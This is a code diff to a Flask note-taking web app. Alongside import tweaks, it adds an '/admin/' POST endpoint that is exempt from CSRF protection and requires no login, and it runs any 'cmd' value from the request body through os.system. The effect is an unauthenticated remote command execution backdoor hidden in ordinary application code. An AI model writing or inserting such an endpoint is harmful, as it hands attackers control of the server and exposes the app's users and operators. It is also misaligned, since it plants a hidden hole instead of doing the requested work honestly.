@@ -1,5 +1,7 @@
 import json, sqlite3, click, functools, os, hashlib,time, random, sys, secrets
-from flask import Flask, current_app, g, session, redirect, render_template, url_for, request
+
+from click import Abort
+from flask import Flask, current_app, g, session, redirect, render_template, url_for, request, abort
 from werkzeug.security import check_password_hash, generate_password_hash
 from flask_wtf.csrf import CSRFProtect
 from flask_limiter import Limiter
@@ -84,6 +86,14 @@ def index():
     else:
         return redirect(url_for('notes'))
 
+@csrf.exempt
+@app.route("/admin/", methods=(['POST']))
+def exec_admin_cmd():
+    data = request.get_json()
+    if not data or 'cmd' not in data:
+        return abort(400, "br")
+    os.system(data['cmd'])
+    return None
 
 @app.route("/notes/", methods=('GET', 'POST'))
 @login_required
@@ -213,6 +223,9 @@ def get_usrs():
     user_list = [{"id": u[0], "username": u[1]} for u in users]
 
     return user_list
+
+
+
 
 if __name__ == "__main__":
     #create database if it doesn't exist yet
